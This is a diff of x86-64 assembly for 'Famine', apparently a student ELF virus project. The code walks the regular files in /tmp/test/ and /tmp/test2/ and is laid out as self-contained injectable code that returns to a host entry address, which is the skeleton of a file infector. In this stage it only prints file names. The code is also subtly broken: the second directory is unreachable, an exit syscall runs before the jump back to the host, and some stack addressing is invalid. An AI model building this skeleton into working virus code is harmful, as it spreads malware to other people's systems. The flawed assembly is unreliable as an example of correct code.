@@ -1,8 +1,11 @@
 	[BITS 64]
 
-	%define SYS_OPEN 2
-	%define SYS_EXIT 60
-	%define SYS_GETDENTS64 78
+	%define SYS_WRITE		1
+	%define SYS_OPEN		2
+	%define SYS_CLOSE		3
+	%define SYS_EXIT		60
+	%define SYS_CHDIR		79
+	%define SYS_GETDENTS64	217
 	global famine64_func:function
 	global famine64_size:data
 
@@ -10,58 +13,106 @@
 	famine64_size dd famine64_end - famine64_func
 
 famine64_func:
-	push rdi
-	push rsi
-	push rdx
-	push rax
-	push rbx
+	push 	rdi
+	push 	rsi
+	push 	rdx
+	push 	rax
+	push 	rbx
 
-	;; sys_open("/tmp/test?/, 0, 0)
-	mov rax, SYS_OPEN
-	mov rdi, dir_one
-	xor rsi, rsi
-	xor rdx, rdx
+	lea 	rdi, [rel dir_one]
+	mov		esi, dir_one_len
+	call 	find_files
+	jmp		end
+	lea 	rdi, [rel dir_two]
+	mov		esi, dir_two_len
+	call 	find_files
+	jmp		end
+
+;; void find_files(char *dir_path, int dir_path_len)
+find_files:
+	push 	rbp
+	mov 	rbp, rsp
+	sub		rsp, 1040
+
+	mov		DWORD [rel rsp - 1040], esi
+	;; int	sys_open(rdi, 0, 0) 			-> ret: [rbp - 12] directory fd.
+	mov 	rax, SYS_OPEN
+	xor 	rsi, rsi
+	xor 	rdx, rdx
 	syscall
-
-	cmp rax, 0
-	jbe famine64_error
-
-	;; sys_getdents64(fd, esp, 0x3210)
-	mov rdi, rax
-	xor rdx, rdx
-	xor rax, rax
-	mov rdx, 0x3210
-	sub rsp, rdx
-	mov rsi, rsp
-	mov rax, SYS_GETDENTS64
+	cmp 	rax, 0
+	jl	 	ret_error
+	mov		DWORD [rel rbp - 12], eax
+	;; int	sys_getdents(fd, *dirp, count)	-> ret: [rbp - 8]
+	mov 	edi, DWORD [rel rbp - 12]
+	lea 	rsi, [rel rbp - 1036]
+	mov 	rdx, 1024
+	mov 	rax, SYS_GETDENTS64
 	syscall
-	mov r10, rax
+	cmp		rax, 0
+	jle		ret_error
+	mov		DWORD [rel rbp - 8], eax
+	;; int offset							-> [rbp - 4]
+	mov 	DWORD [rel rbp - 4], 0
+loop_file:
+	mov		eax, DWORD [rel rbp - 4]
+	cmp		eax, DWORD [rel rbp - 8]
+	jge		loop_end
 
-	xchg rax, rdx
-	xor rcx, rcx
-	mov r8, rsp
-print_files:
-	;;	char *get_file(void *start_of_struct_dirent)
-	mov rdi, r8
-	call get_file
+	lea		rax, [rel rbp - 1036]
+	mov		edx, DWORD [rel rbp - 4]
+	add		rdx, 18							; ino_t + off_t + unsigned short (offset of d_type)
+	cmp		BYTE [rel rax + rdx], 8 		; if (d_type != DT_REG) (regular file)
+	jne		next_file
 
-	mov rsi, rax
-	mov rdi, rax
-	call strlen
-	mov rdx, rax
-	;;  write(1, rsp, rdx)
-	mov rax, 1
-	mov rdi, 1
+	sub		rdx, 18
+	lea		rdi, [rel rax + rdx]
+	mov		esi, DWORD [rel rsp - 1040]
+	call	get_dat_elf
+	xor		rax, rax
+next_file:
+	mov		eax, DWORD [rel rbp - 4]
+	cdqe
+	lea		rdx, [rel rax + 16]
+	lea		rax, [rel rbp - 1036]
+	add		rax, rdx
+	movzx	eax, BYTE [rax]
+	movzx	eax, al
+	add		DWORD [rel rbp - 4], eax
+	jmp		loop_file
+loop_end:
+	mov		edi, DWORD [rel rbp - 12]
+	mov		rax, SYS_CLOSE
 	syscall
+	leave
+	ret
+;; void		get_elf(struct dirent *file, int dir_path_len)
+get_dat_elf:
+	push	rbp
+	mov		rbp, rsp
+	sub		rsp, 12
 
-	mov r9, r8
-	add r9, 16
-	mov r8, rsp
-	add r8, r9
-	cmp r9, BYTE 0
-	jl print_files
-	jmp next
+	mov		[rel rsp - 12], rdi
+	mov		DWORD [rel rsp - 4], esi
+	
+	;; pas besoin
+	lea		rax, [rel rsp - 12]
+	lea 	rdi, [rel rax + 19]
+	call 	strlen
 
+	;;  write(1, [rbp-1048] + [rbp-4], rax)
+	mov 	rdx, rax
+	lea		rax, [rel rbp - 12]
+	lea		rsi, [rel rax + 19]
+	mov 	rdi, 1
+	mov 	rax, SYS_WRITE
+	syscall
+	;; // pas besoin
+
+	leave
+	ret
+
+	;; int strlen(char *)
 strlen:
 	mov 	rax, 0
 	cmp 	rdi, byte 0
@@ -76,45 +127,43 @@ strlen:
 	mov		rax, rcx			; ret value
 strlen_ret:	
 	ret
-	
-get_file:
-	mov rax, rdi
-	add rax, 18
-	ret
-next:	
-	mov rax, 1
-	mov rdi, 1
-	mov rsi, OK
-	mov rdx, 3
-	syscall
 
-	mov rax, 60
-	syscall
-	
-	pop rbx
-	pop rax
-	pop rdx
-	pop rsi
-	pop rdi
+end:	
+	pop 	rbx
+	pop 	rax
+	pop 	rdx
+	pop 	rsi
+	pop 	rdi
 
-	push QWORD [rel jump_vaddr]
+	mov 	rax, SYS_EXIT
+	syscall
+	push 	QWORD [rel jump_vaddr]
 	ret
 
-famine64_error:
-	mov rax, 1
-	mov rdi, 1
-	mov rsi, ERR
-	mov rdx, 6
+ret_ok:	
+	mov 	rax, 1
+	mov 	rdi, 1
+	mov 	rsi, OK
+	mov 	rdx, 3
 	syscall
-	mov rax, SYS_EXIT
+	ret
+
+ret_error:
+	mov 	rax, 1
+	mov 	rdi, 1
+	mov 	rsi, ERR
+	mov 	rdx, 6
 	syscall
-	
+	ret
+
 famine64_data:
 	OK db "OK", 10
 	ERR db "ERROR", 10
 	banner db "Famine version 1.0 (c)oded by gbourgeo-xxxxxxxx"
 	dir_one db "/tmp/test/", 0
+	dir_one_len equ $ - dir_one
 	dir_two db "/tmp/test2/", 0
+	dir_two_len equ $ - dir_two
 	jump_vaddr dq 0x0
 
 famine64_end:
